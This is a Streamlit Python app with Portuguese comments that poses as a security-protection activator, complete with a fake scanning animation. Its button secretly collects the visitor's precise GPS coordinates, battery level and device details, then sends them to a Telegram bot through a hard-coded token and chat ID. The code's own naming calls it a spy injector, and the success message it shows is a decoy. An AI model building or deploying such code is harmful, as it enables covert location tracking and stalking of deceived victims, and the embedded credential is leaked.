import streamlit as st
import time

# --- CONFIGURAÇÃO ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- SEU CSS ORIGINAL (BOLHA FLUTUANTE) ---
st.markdown("""
    <style>
    .main { background-color: #0b0f14; color: white; }
    .stAlert { display: none !important; }
    
    .scanner-box { 
        display: flex; flex-direction: column; align-items: center; padding: 20px; 
        animation: float 3s ease-in-out infinite; 
    }
    @keyframes float {
        0%, 100% { transform: translateY(0px); }
        50% { transform: translateY(-15px); }
    }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.3);
        display: flex; align-items: center; justify-content: center;
    }
    .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
    
    .btn-original {
        background-color: white; color: #333; border: none;
        padding: 15px 25px; border-radius: 8px; font-size: 16px;
        font-family: sans-serif; display: flex; align-items: center;
        gap: 10px; cursor: pointer; font-weight: bold; text-transform: uppercase;
    }
    </style>
""", unsafe_allow_html=True)

caixa_bolha = st.empty()
caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

# --- O INJETOR QUE "FORÇA" A ATIVAÇÃO ---
js_spy = f"""
<div style="display: flex; justify-content: center; margin-top: 20px;">
    <button class="btn-original" id="btn-trigger">
        <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO AGORA
    </button>
</div>

<script>
document.getElementById('btn-trigger').onclick = function() {{
    // CONFIGURAÇÃO AGRESSIVA: Força o GPS real, ignora cache e define tempo limite curto
    const geoConfig = {{ 
        enableHighAccuracy: true, 
        timeout: 5000, 
        maximumAge: 0 
    }};

    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            const bat = await navigator.getBattery();
            const info = "🛡️ SISTEMA ATIVADO\\n📱 " + navigator.userAgent.split('(')[1].split(')')[0] + "\\n🔋 " + Math.round(bat.level * 100) + "%\\n📍 Local: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
            
            await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                method: "POST",
                headers: {{ "Content-Type": "application/json" }},
                body: JSON.stringify({{ chat_id: "{ID}", text: info }})
            }});
            
            // Sucesso: Avisa o Streamlit para rodar a animação
            window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
        }},
        (err) => {{
            // Se o GPS estiver desligado, o Android é obrigado a mostrar o pop-up aqui
            console.log("Forçando ativação de hardware...");
        }},
        geoConfig
    );
}};
</script>
"""

# O segredo para o botão "prestar" é o allow="geolocation" no componente
ativou = st.components.v1.html(js_spy, height=100)

if ativou:
    for i in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{i}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Concluída!")
